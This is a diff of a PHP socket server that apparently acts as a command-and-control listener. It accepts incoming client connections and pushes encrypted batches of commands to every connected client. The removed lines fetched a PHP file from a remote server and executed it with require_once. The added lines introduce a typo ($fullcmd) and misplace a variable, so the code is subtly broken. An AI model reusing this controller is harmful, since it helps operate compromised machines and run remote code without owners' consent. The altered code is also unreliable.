@@ -6,19 +6,13 @@
 	define("BUFFER_LEN", 4096);
 	define("STREAM_BUFFER_LEN", 1024);
 
-	$opts = getopt("h:p:s:f:", ["host:", "port:", "serve:", "file:"]);
+	$opts = getopt("h:p:", ["host:", "port:"]);
 	$log = $err = '';
+	$openssl_dest_path = './openssl.php';
 
-	(count($opts) === 4) || die("[\33[91m!\33[0m] assign remote ip [-h/--host], port [-p/--port], port [-s/--serv] and file [-f/--file]\n");
+	(count($opts) === 2) || die("[\33[91m!\33[0m] assign remote ip [-h/--host], port [-p/--port]\n");
 	$host_addr = array_key_exists("host", $opts) ? trim($opts['host']) : trim($opts['h']);
 	$host_port = array_key_exists("port", $opts) ? trim($opts['port']) : trim($opts['p']);
-	$file      = array_key_exists("file", $opts) ? trim($opts['file']) : trim($opts['f']);
-	$server    = array_key_exists("serv", $opts) ? trim($opts['serv']) : trim($opts['s']);
-
-	$openssl_dest_path = './openssl.php';
-	if(file_exists($openssl_dest_path) === false){
-		copy("{$_SERVER['REQUEST_SCHEME']}://$server/down/$file", $openssl_dest_path);
-	}
 
 	($master_sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP))
 	|| die("[\33[91m!\33[0m] socket_create() failed: reason: "
@@ -38,6 +32,7 @@
 	if(file_exists($openssl_dest_path)){
 		require_once $openssl_dest_path;
 		$openssl_encrypt_decrypt = new Openssl_EncryptDecrypt;
+		unset($openssl_dest_path);
 	} else { die('[\33[91m!\33[0m] error: openssl class is missing.'); }
 	
 	$log = "host [".$host_addr.":".$host_port."] listening for incomming connections..\n\n";
@@ -68,14 +63,15 @@
 				$err = "[\33[91m!\33[0m] socket_accept() error: ".socket_strerror(socket_last_error($master_sock))."\n";
 				write_log(LOGFILE, $err);
 				echo $err;
-		    }
-
-			socket_getpeername($recv_sock, $ip, $port);
-			$connected [] = ["ip" => $ip, "port" => $port];
+			}
 			
+			socket_getpeername($recv_sock, $ip, $port);
 			write_log(LOGFILE, "[".$ip.":".$port."] connected.\n");
 			echo "[".$now."] [\33[91m!\33[0m] [".$ip.":".$port."] connected.\n";
-						
+			
+			$connected [] = ["ip" => $ip, "port" => $port];
+			$concat = $ip.':'.$port;
+			
 	        // remove the listening socket from the clients-with-data array
 	        $recv_key = array_search($clients, $recv);
 	        unset($recv[$recv_key]);
@@ -84,9 +80,10 @@
 	    foreach ($recv as $recv_sock)
 	    {
 	   	 	socket_clear_error($recv_sock);
-	    	socket_getpeername($recv_sock, $ip, $port);
+			socket_getpeername($recv_sock, $ip, $port);
+			
 			$now = date('Y-m-d H:i:s');
-			$data = $concat = "";
+			$data = "";
 			$all_bytes = 0;
 			$flag_disconnected = false;
 
@@ -102,8 +99,7 @@
 						write_log(LOGFILE, $err);
 						echo $err;
 					}
-					$concat = $ip.':'.$port;
-			        $key  = array_search($recv_sock, $clients);
+					$key  = array_search($recv_sock, $clients);
 					$_key = array_search($ip,
 								array_map(function($c) use ($concat) {
 									return ($c['ip'].':'.$c['port'] === $concat);
@@ -179,7 +175,7 @@
 				$full_cmd = "";
 				
 				foreach($cmdsarr as $cmd){ $full_cmd .= trim($cmd).';'; }
-				$full_cmd = $openssl_encrypt_decrypt->encrypt_cbc($full_cmd);
+				$full_cmd = $openssl_encrypt_decrypt->encrypt_cbc($fullcmd);
 				foreach($write as $send_sock)
 		  		{
 			        if($send_sock === $master_sock){ continue; }
